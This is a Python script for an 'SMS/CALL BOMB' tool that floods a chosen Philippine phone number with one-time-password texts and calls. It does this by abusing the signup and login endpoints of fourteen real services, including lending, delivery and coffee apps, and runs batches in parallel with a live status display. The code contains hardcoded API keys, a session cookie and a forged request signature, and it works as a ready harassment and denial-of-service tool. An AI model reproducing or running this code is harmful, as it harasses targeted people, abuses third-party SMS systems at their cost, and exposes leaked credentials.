
import random
import string
import time
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import sys
import time
import sys

def slow_print(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_line(text, wait=1.5):
    slow_print(text)
    time.sleep(wait)

# ===== START =====

print("\n")
slow_print("Loading please wait", 0.05)

# loading animation
for _ in range(3):
    sys.stdout.write(".")
    sys.stdout.flush()
    time.sleep(0.6)
print("\n")

time.sleep(1)

loading_line("[•] installing SMS BOMB ")
loading_line("[•] installing CALL BOMB ")
loading_line("[•] installing safety api")
loading_line("[•] installing User Safety")

slow_print("all installation complete", 0.04)
time.sleep(1)

slow_print("[•] Dont try your own number 30-40% block due NEW API attach", 0.02)
time.sleep(1)

slow_print("[•] PREMIUM ADDED", 0.04)
print()

# user input
choice = input("press Y to continue the tool interface: ")

if choice.lower() == "y":
    slow_print("\nOpening tool interface...", 0.05)
else:
    slow_print("\nExited.", 0.05)
def install_packages():
    required = ['requests', 'colorama', 'pyfiglet', 'rich']
    for package in required:
        try:
            if package == 'colorama':
                import colorama
            elif package == 'pyfiglet':
                import pyfiglet
            elif package == 'rich':
                import rich
            else:
                __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            os.system(f"{sys.executable} -m pip install {package}")

install_packages()

from colorama import init
import pyfiglet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich import box
from rich.live import Live

init(autoreset=True)
console = Console()

class GoldenBombTool:
    def __init__(self):
        self.osim_url = "https://prod.services.osim-cloud.com/identity/api/v1.0/account"
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.session = requests.Session()
        
        self.all_services = [
            ("SPAM CALL", self.send_bomb_otp),
            ("MWELL ULTRA", self.send_mwell_ultra_fast),
            ("EZLOAN", self.send_ezloan),
            ("XPRESS PH", self.send_xpress),
            ("ABENSON", self.send_abenson),
            ("EXCELLENT LENDING", self.send_excellent_lending),
            ("BISTRO", self.send_bistro),
            ("WEMOVE", self.send_wemove),
            ("LBC CONNECT", self.send_lbc),
            ("PICKUP COFFEE", self.send_pickup_coffee),
            ("HONEY LOAN", self.send_honey_loan),
            ("KUMU PH", self.send_kumu_ph),
            ("S5.COM", self.send_s5_otp),
            ("QUICK OTP", self.send_quick_otp)
        ]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        self.clear_screen()
        try:
            f = pyfiglet.Figlet(font='isometric1')
            ascii_art = f.renderText("SMS")
        except:
            ascii_art = "SMS"
        
        banner_text = Text(ascii_art, style="Bold #FF0000")
        subtitle = Text("Developed by LYNX", style="bold black on #00ff00")
        
        grid = Table.grid(expand=True)
        grid.add_column(justify="center")
        grid.add_row(banner_text)
        grid.add_row(Text(" ", style="dim"))
        grid.add_row(subtitle)
        
        panel = Panel(
            grid,
            border_style="#00ff00",
            box=box.ROUNDED,
            padding=(1, 2)
        )
        console.print(panel)
        console.print(Align.center("[#DAA520]Telegram:Coming soon | [/]"))
        print()

    def print_menu(self):
        menu_table = Table(show_header=False, box=box.SIMPLE, padding=(0, 2), expand=False)
        menu_table.add_column("Option", justify="right", style="bold #FF0000")
        menu_table.add_column("Description", justify="left", style="#FF0000")
        
        options = [
            ("[1]", "Start SMS/CALL BOMB"),
            ("[2]", "View Statistics"),
            ("[3]", "About"),
            ("[0]", "Exit")
        ]
        
        for opt, desc in options:
            menu_table.add_row(opt, desc)
        
        panel = Panel(
            Align.center(menu_table),
            title="[bold #00ff00]MAIN MENU[/]",
            border_style="#00ff00",
            padding=(1, 5),
            expand=False
        )
        console.print(Align.center(panel))

    def show_about(self):
        grid = Table.grid(padding=(1, 2))
        grid.add_column(justify="right", style="bold #FFD700")
        grid.add_column(justify="left", style="#FFE873")
        
        grid.add_row("Developer:", "LYNX")
        grid.add_row("Telegram:", "N/A")
        grid.add_row("Version:", "NEW VERSION 2.0")
        
        panel = Panel(
            Align.center(grid),
            title="[bold #FF0000]DEVELOPER INFO[/]",
            border_style="#FFD700",
            padding=(1, 5)
        )
        console.print("\n")
        console.print(Align.center(panel))

    def format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone
    
    def validate_phone(self, phone):
        import re
        clean_phone = self.format_phone(phone)
        return bool(re.match(r'^9\d{9}$', clean_phone))
    
    def random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_kumu_signature(self, timestamp, random_str, phone_number):
        secret = "kumu_secret_2024"
        data = f"{timestamp}{random_str}{phone_number}{secret}"
        return hashlib.sha256(data.encode()).hexdigest()

    def send_mwell_ultra_fast(self, phone_number):
        API_URL = "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number"
        API_KEY = "0a57846786b34b0a89328c39f584892b"
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': API_KEY,
                'x-app-version': '03.942.035',
                'x-device-type': 'android',
                'x-device-model': 'oneplus CPH2465',
                'content-type': 'application/json; charset=utf-8'
            }
            data = {"country": "PH", "phoneNumber": formatted_phone, "phoneNumberPrefix": "+63"}
            response = requests.post(API_URL, json=data, headers=headers, timeout=10)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get("c") == 200:
                    timer = resp_json.get('d', {}).get('timer', 60)
                    return True, f"Sent - {timer}s"
                else:
                    return False, f"Err:{resp_json.get('c')}"
            else:
                return False, f"HTTP {response.status_code}"
        except Exception as e:
            return False, "Error"

    def send_bomb_otp(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465)',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'accept-language': 'en-SG',
                'region': 'PH'
            }
            credentials = {"userName": formatted_phone, "phoneCode": "63", "password": f"Temp{random.randint(1000,9999)}!"}
            response = requests.post(f"{self.osim_url}/register", headers=headers, json=credentials, timeout=8)
            if response.status_code == 200:
                result = response.json()
                if result.get('resultCode', 0) in [201000, 200000]:
                    return True, "Success"
                return False, f"Fail {result.get('resultCode')}"
            return False, f"HTTP {response.status_code}"
        except:
            return False, "Error"

    def send_ezloan(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            current_time = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json',
                'blackbox': f'kGPGg{current_time}DCl3O8MVBR0',
            }
            data = {"businessId": "EZLOAN", "contactNumber": f"+63{formatted_phone}", "appsflyerIdentifier": f"{current_time}"}
            response = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=headers, json=data, timeout=8)
            if response.status_code == 200 and response.json().get('code') == 0:
                return True, "Success"
            return False, "Failed"
        except:
            return False, "Error"

    def send_xpress(self, phone_number, index):
        try:
            headers = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json"}
            timestamp = int(time.time())
            data = {"FirstName": f"U{timestamp}", "LastName": "T", "Email": f"u{timestamp}@gm.com",
                    "Phone": f"+63{self.format_phone(phone_number)}", "Password": "Pass", "ConfirmPassword": "Pass"}
            response = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", headers=headers, json=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, f"HTTP {response.status_code}"
        except: return False, "Error"

    def send_abenson(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded'}
            data = f'contact_no={phone_number}&login_token=undefined'
            response = requests.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', headers=headers, data=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_excellent_lending(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
            data = {"domain": phone_number, "cat": "login", "previous": False, "financial": self.random_string(32)}
            response = requests.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', headers=headers, json=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_bistro(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 16)',
                'x-requested-with': 'com.allcardtech.bistro'
            }
            url = f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted_phone}'
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200 and response.json().get('isSuccessful'):
                return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_wemove(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.9.3', 'Content-Type': 'application/json'}
            data = {"phone_country": '+63', "phone_no": self.format_phone(phone_number)}
            response = requests.post('https://api.wemove.com.ph/auth/users', headers=headers, json=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_lbc(self, phone_number):
        try:
            headers = {'User-Agent': 'Dart/2.19', 'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'verification_type': 'mobile', 'client_contact_no': self.format_phone(phone_number)}
            response = requests.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', headers=headers, data=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_pickup_coffee(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
            data = {"mobile_number": f"+63{self.format_phone(phone_number)}", "login_method": 'mobile_number'}
            response = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', headers=headers, json=data, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_honey_loan(self, phone_number):
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
            data = {"phone": phone_number, "is_rights_block_accepted": 1}
            response = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', headers=headers, json=data, timeout=8)
            if response.status_code == 200 and response.json().get('success'): return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_kumu_ph(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            ts = int(time.time())
            sig = self.generate_kumu_signature(ts, self.random_string(32), formatted_phone)
            headers = {'Content-Type': 'application/json'}
            data = {"country_code": "+63", "cellphone": formatted_phone, "encrypt_signature": sig, "encrypt_timestamp": ts}
            response = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=data, timeout=10)
            if response.status_code in [200, 403]: return True, "Success"
            return False, "Fail"
        except: return False, "Err"

    def send_s5_otp(self, phone_number):
        try:
            normalized_phone = f"+63{self.format_phone(phone_number)}"
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            headers = {'content-type': f'multipart/form-data; boundary={boundary}'}
            body = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{normalized_phone}\r\n--{boundary}--\r\n'
            response = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Error"

    def send_quick_otp(self, phone_number):
        try:
            SESSION = "f70a8830da63f9a280683a02cac20a3376a1adc7"
            target = f"63{self.format_phone(phone_number)}"
            headers = {'Cookie': f'session_id={SESSION}'}
            response = requests.post("https://staging.2bo.app/v1/send_otp", json={"params": {"mobile": target}}, headers=headers, timeout=10)
            if response.status_code == 200: return True, "Success"
            return False, "Fail"
        except: return False, "Err"

    def create_service_grid(self, status_map):
        grid_layout = Table(box=box.SIMPLE, show_header=False, expand=True, padding=(0, 1))
        grid_layout.add_column(ratio=1)
        grid_layout.add_column(ratio=1)
        
        half = len(self.all_services) // 2
        col1_table = Table(box=box.SIMPLE, show_header=False, expand=True)
        col2_table = Table(box=box.SIMPLE, show_header=False, expand=True)
        
        col1_table.add_column("Service", style="#00ff00")
        col1_table.add_column("Status", justify="right")
        col2_table.add_column("Service", style="#00ff00")
        col2_table.add_column("Status", justify="right")

        for i, (name, _) in enumerate(self.all_services):
            status = status_map.get(name, {"state": "pending", "msg": "..."})
            
            if status["state"] == "pending":
                status_str = "[#8B8000]Waiting...[/]"
            elif status["state"] == "running":
                status_str = "[bold #FFD700]Sending...[/]"
            elif status["state"] == "success":
                status_str = f"[bold #32CD32]✓ Success[/]"
            else:
                status_str = f"[bold red]✗ Failed[/]"
            
            if i < half:
                col1_table.add_row(name, status_str)
            else:
                col2_table.add_row(name, status_str)

        grid_layout.add_row(col1_table, col2_table)
        return Panel(grid_layout, title="[bold #00ff00]ACTIVE SERVICES[/]", border_style="#FFD700")

    def execute_parallel_attack(self, phone_number, amount):
        formatted_phone = self.format_phone(phone_number)
        total_services = len(self.all_services)
        
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        
        console.print(Panel(
            f"[bold #FFD700]Target:[/] +63{formatted_phone}\n"
            f"[bold #FFD700]Batches:[/] {amount} × {total_services} services",
            border_style="#FFD700"
        ))
        
        with Progress(
            SpinnerColumn("dots", style="#00ff00"),
            TextColumn("[bold #00ff00]{task.description}"),
            BarColumn(bar_width=None, style="#00ff00", complete_style="bold #FFD700"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as batch_progress:
            
            main_task = batch_progress.add_task("Overall Progress", total=amount)
            
            for batch_num in range(1, amount + 1):
                status_map = {name: {"state": "pending", "msg": "..."} for name, _ in self.all_services}
                
                with Live(self.create_service_grid(status_map), refresh_per_second=10, console=console) as live:
                    
                    batch_progress.update(main_task, description=f"Batch {batch_num}/{amount}")
                    
                    for name in status_map:
                        status_map[name]["state"] = "running"
                    live.update(self.create_service_grid(status_map))
                    
                    with ThreadPoolExecutor(max_workers=14) as executor:
                        future_to_service = {}
                        for service_name, service_func in self.all_services:
                            if service_name == "XPRESS PH":
                                future = executor.submit(service_func, phone_number, batch_num)
                            else:
                                future = executor.submit(service_func, phone_number)
                            future_to_service[future] = service_name
                        
                        for future in as_completed(future_to_service):
                            service_name = future_to_service[future]
                            try:
                                success, message = future.result(timeout=15)
                                self.total_attempts += 1
                                
                                if success:
                                    self.success_count += 1
                                    status_map[service_name] = {"state": "success", "msg": message}
                                else:
                                    self.fail_count += 1
                                    status_map[service_name] = {"state": "fail", "msg": "Failed"}
                            except Exception as e:
                                self.fail_count += 1
                                self.total_attempts += 1
                                status_map[service_name] = {"state": "fail", "msg": "Timeout"}
                            
                            live.update(self.create_service_grid(status_map))
                
                batch_progress.advance(main_task)
                
                if batch_num < amount:
                    delay = random.uniform(3, 5)
                    time.sleep(delay)
        
        self.show_statistics()

    def show_statistics(self):
        total = self.success_count + self.fail_count
        success_rate = (self.success_count / total * 100) if total > 0 else 0
        
        stats_table = Table(box=box.ROUNDED, border_style="#00ff00")
        stats_table.add_column("Metric", style="bold #00ff00")
        stats_table.add_column("Value", style="#FFE873", justify="right")
        
        stats_table.add_row("Total Attempts", str(self.total_attempts))
        stats_table.add_row("Successful", f"[bold #32CD32]{self.success_count}[/]")
        stats_table.add_row("Failed", f"[bold red]{self.fail_count}[/]")
        stats_table.add_row("Success Rate", f"[bold #00ff00]{success_rate:.1f}%[/]")
        
        console.print("\n")
        console.print(Panel(Align.center(stats_table), title="[bold #00ff00]SMS RESULTS[/]", border_style="#FFD700"))
        print()

    def run(self):
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = console.input("[bold #00ff00]lynx: [/]").strip()
            
            if choice == '1':
                self.attack_mode()
            elif choice == '2':
                self.clear_screen()
                self.print_banner()
                self.show_statistics()
                console.input("\n[#00ff00]Press Enter to continue...[/]")
            elif choice == '3':
                self.clear_screen()
                self.print_banner()
                self.show_about()
                console.input("\n[#00ff00]Press Enter to continue...[/]")
            elif choice == '0':
                console.print("\n[bold #00ff00]Exiting  SMS Tool...[/]")
                break
            else:
                console.print("[bold red]Invalid option![/]")
                time.sleep(1)
    
    def attack_mode(self):
        self.print_banner()
        
        while True:
            console.print("[bold #FFD700]Enter Target Number (09xxxxxxxxx)[/]: ", end="")
            phone = input().strip()
            
            if not phone: return
            
            if self.validate_phone(phone):
                console.print("[bold #32CD32]✓ Valid number[/]")
                break
            else:
                console.print("[bold red]✗ Invalid format[/]")
        
        while True:
            console.print("[bold #00ff00]Enter Batch Count (1-50)[/]: ", end="")
            try:
                amt_str = input().strip()
                amount = int(amt_str) if amt_str else 1
                if 1 <= amount <= 50: break
                console.print("[bold red]Range must be 1-50[/]")
            except:
                console.print("[bold red]Enter a number[/]")
        
        console.print("\n[bold white on #00ff00] STARTING SMS CAMPAIGN [/]")
        if input("Confirm? (y/n): ").lower() == 'y':
            self.execute_parallel_attack(phone, amount)
            input("\n[bold #FFD700]Press Enter to return...[/]")
        else:
            console.print("[bold #FFD700]Cancelled[/]")
            time.sleep(1)

def main():
    try:
        tool = GoldenBombTool()
        tool.run()
    except KeyboardInterrupt:
        console.print("\n\n[bold #FF0000]Exit requested[/]")
    except Exception as e:
        console.print(f"\n[bold red]Error: {e}[/]")

if __name__ == "__main__":
    main() 